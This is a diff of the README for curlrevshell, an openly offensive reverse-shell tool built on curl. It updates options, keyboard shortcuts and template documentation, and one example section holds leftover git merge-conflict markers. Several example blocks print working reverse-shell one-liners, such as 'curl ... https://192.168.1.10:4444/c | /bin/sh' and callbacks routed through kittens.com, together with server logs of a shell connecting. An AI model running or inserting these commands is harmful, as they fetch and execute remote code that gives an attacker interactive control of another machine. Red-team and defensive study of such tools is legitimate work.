@@ -33,6 +33,7 @@ Example
 -------
 It should look like the following, but with nicer colors:
 ```
+<<<<<<< HEAD
 $ go install github.com/magisterquis/curlrevshell@betterctrli
 go: downloading github.com/magisterquis/goxterm v0.0.1-beta.2.0.20241203122007-0b5affac8356
 go: downloading golang.org/x/exp v0.0.0-20250606033433-dcc06ee1d476
@@ -43,12 +44,24 @@ go: downloading golang.org/x/text v0.26.0
 go: downloading golang.org/x/tools v0.34.0
 $ curlrevshell
 01:04:42.758 Welcome to curlrevshell version v0.0.1-beta.7.0.20241203223504-11db2dd9b630 (betterctrli branch)
+=======
+$ go install github.com/magisterquis/curlrevshell@dev
+go: downloading github.com/magisterquis/goxterm v0.0.1-beta.4
+go: downloading golang.org/x/exp v0.0.0-20251009144603-d2f985daa21b
+go: downloading golang.org/x/net v0.46.0
+go: downloading golang.org/x/sync v0.17.0
+go: downloading golang.org/x/sys v0.37.0
+go: downloading golang.org/x/text v0.30.0
+go: downloading golang.org/x/tools v0.38.0
+$ curlrevshell
+01:04:42.758 Welcome to curlrevshell version v0.0.1-beta.7.0.20251004180818-66c8dc187a22 (dev branch)
+>>>>>>> dev
 01:04:42.760 Listening on 0.0.0.0:4444
 01:04:42.760 To get a shell:
 
 curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c | /bin/sh
 
-01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
+01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444 Path:/c
 01:04:55.259 [192.168.1.20] Input connected: ID:1jns1whwi1p1q
 01:04:55.259 [192.168.1.20] Output connected: ID:1jns1whwi1p1q
 01:04:55.259 [192.168.1.20] Shell is ready to go!
@@ -69,15 +82,15 @@ Even worse reverse shell, powered by cURL.
 
 Keyboard Shortcuts:
 Ctrl+I - Insert the file or directory specified with -ctrl-i
-Ctrl+J - Print locally what Ctrl+I would send
 Ctrl+O - Mute output for a couple of seconds (for if you cat a huge file)
+Ctrl+S - Print locally what Ctrl+I would send
 Tab    - Same as Ctrl+I
 
 Options:
   -callback-address address
     	Additional callback address or domain, for one-liner printing (may be repeated)
   -callback-template template
-    	Optional callback template file, used if it exists
+    	Optional template file, used if it exists (deprecated)
   -ctrl-i source
     	Tab/Ctrl+I's insertion source file or directory
   -debug
@@ -102,6 +115,8 @@ Options:
     	Terminal prompt; don't forget a trailing space (default "> ")
   -serve-files-from directory
     	Optional directory from which to serve static files
+  -template template
+    	Optional template file, used if it exists
   -tls-certificate-cache file
     	Optional file in which to cache generated TLS certificate (default "/home/stuart/.cache/sstls/cert.txtar")
 ```
@@ -118,23 +133,24 @@ Endpoint          | Description
 `/o/{id}`         | Output from the shell to you, one line at a time.  The `{id}` has to match `/i`'s.
 `/{anythingelse}` | Either serves up files or 404's if nobody gave it `-serve-files-from` (which doesn't actually have to be a directory).
 
-Callback Template
------------------
-The script generated with `/c` can be changed by writing a new template and
-telling the program about it with `-print-default-template`.  It usually looks
-like
+The endpoints can be changed (for evasion, humor, etc); see
+[the docs](./doc/config.md) for more details.
+
+Template
+--------
+The script generated with `/c` as well as the helpful one-liners printed on
+startup can be changed by writing a new template and telling the program about
+it with `-template`.  It usually looks like
 ```sh
 $ curlrevshell -print-default-template >custom.tmpl # Get the default template to start with
 $ vim ./custom.tmpl                                 # Mod ALL the things!
-$ curlrevshell -callback-template ./custom.tmpl     # Run with your fancy new template
+$ curlrevshell -template ./custom.tmpl              # Run with your fancy new template
 ```
-The struct passed to the template is `TemplateParams` in
-[script.go](internal/hsrv/script.go).  The default template is
-[script.tmpl](internal/hsrv/script.tmpl).  It's re-read every time it's needed,
-so feel free to change it as often as you'd like.
-
-A script to generate a custom callback template with embedded shell functions
-can be made with `make tools/funcgen` and is found in `tools/funcgen`.
+The struct passed to the template is `Params` in
+[crstemplate.go](lib/crstemplate/crstemplate.go).
+The default template is [default.tmpl](lib/crstemplate/default.tmpl).
+It's re-read every time it's needed, so feel free to change it as often as
+you'd like.
 
 On Linux, you'll probably need BSD make(`apt/yum/such install bmake`, or
 thereabouts) and add a `b` before the `make`s.
@@ -153,13 +169,14 @@ curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= htt
 ```
 The `curl` command in the script:
 ```sh
-curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com/i/1upal29kpq9g7 </dev/null 2>&0 |
+curl -sk --pinnedpubkey sha256//pSUroiq0g92Z3m08n7g/zPQyspRyjm2x/enFRndcdL0= https://kittens.com/i/1upal29kpq9g7 -N  </dev/null 2>&0 |
 ```
-With `?c2=kittens.com` it would have been `https://192.168.1.10:4444` instead.
+Without `?c2=kittens.com` it would have been `https://192.168.1.10:4444`
+instead.
 
 The server also tells us that the script was generated for `kittens.com`:
 ```
-22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com
+22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com:443 Path:/c
 ```
 
 ### As a header
@@ -170,11 +187,11 @@ curl -Hc2:kittens.com:22 -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B
 ```
 Weird flex, but it worked.
 ```sh
-curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com:22/i/2v0ohzqf5kw1t </dev/null 2>&0 |
+curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://kittens.com:22/i/2v0ohzqf5kw1t -N  </dev/null 2>&0 |
 ```
 Server agrees
 ```
-22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22
+22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22 Path:/c
 ```
 
 TLS
